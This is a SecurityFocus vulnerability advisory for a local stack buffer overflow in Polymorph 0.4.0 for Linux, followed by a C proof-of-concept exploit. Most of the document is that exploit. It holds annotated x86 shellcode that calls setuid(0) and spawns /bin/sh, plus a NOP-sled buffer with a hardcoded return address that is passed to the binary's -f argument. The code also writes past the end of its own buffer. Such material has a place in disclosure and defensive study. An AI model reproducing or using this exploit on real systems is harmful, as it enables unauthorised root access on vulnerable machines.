source: http://www.securityfocus.com/bid/7663/info

Polymorph for Linux has been reported prone to a buffer overflow vulnerability.

The issue is reportedly due to a lack of sufficient bounds checking performed on user-supplied data before it is copied into an internal memory space.

Specifically, excessive data passed as the 'file' argument to the vulnerable Polymorph executable, when copied into internal memory, may overrun the boundary of the assigned buffer and corrupt adjacent memory.

This vulnerability may be exploited to execute arbitrary attacker-supplied code.

It should be noted that although this vulnerability has been reported to affect Polymorph version 0.4.0 previous versions might also be affected.

/* c-polymorph.c
 *
 * PoC exploit made for advisory based uppon an local stack based overflow.
 * Vulnerable versions, maybe also prior versions:
 *
 * Polymorph v0.4.0
 *
 * Tested on:  Redhat 8.0
 *
 * Advisory source: c-code.net (security research team)
 * http://www.c-code.net/Releases/Advisories/c-code-adv001.txt
 *
 * ---------------------------------------------
 * coded by: demz (c-code.net) (demz@c-code.net)
 * ---------------------------------------------
 *
 */

#include <stdio.h>

char shellcode[]=

        "\x31\xc0"                      // xor          eax, eax
        "\x31\xdb"                      // xor          ebx, ebx
        "\x31\xc9"                      // xor          ecx, ecx
        "\xb0\x46"                      // mov          al, 70
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\x50"                          // push         eax
        "\x68\x6e\x2f\x73\x68"          // push  long   0x68732f6e
        "\x68\x2f\x2f\x62\x69"          // push  long   0x69622f2f
        "\x89\xe3"                      // mov          ebx, esp
        "\x50"                          // push         eax
        "\x53"                          // push         ebx
        "\x89\xe1"                      // mov          ecx, esp
        "\x99"                          // cdq
        "\xb0\x0b"                      // mov          al, 11
        "\xcd\x80"                      // int          0x80

        "\x31\xc0"                      // xor          eax, eax
        "\xb0\x01"                      // mov          al, 1
        "\xcd\x80";                     // int          0x80

int main()
{
        unsigned long ret = 0xbffff3f0;

        char buffer[2076];
        int i=0;

        memset(buffer, 0x90, sizeof(buffer));

        for (0; i < strlen(shellcode) - 1;i++)
        buffer[1000 + i] = shellcode[i];

        buffer[2076] = (ret & 0x000000ff);
        buffer[2077] = (ret & 0x0000ff00) >> 8;
        buffer[2078] = (ret & 0x00ff0000) >> 16;
        buffer[2079] = (ret & 0xff000000) >> 24;
        buffer[2080] = 0x0;

        printf("\nPolymorph v0.4.0 local exploit\n");
        printf("---------------------------------------- demz @ c-code.net --\n");

        execl("./polymorph", "polymorph", "-f", buffer, NULL);
}

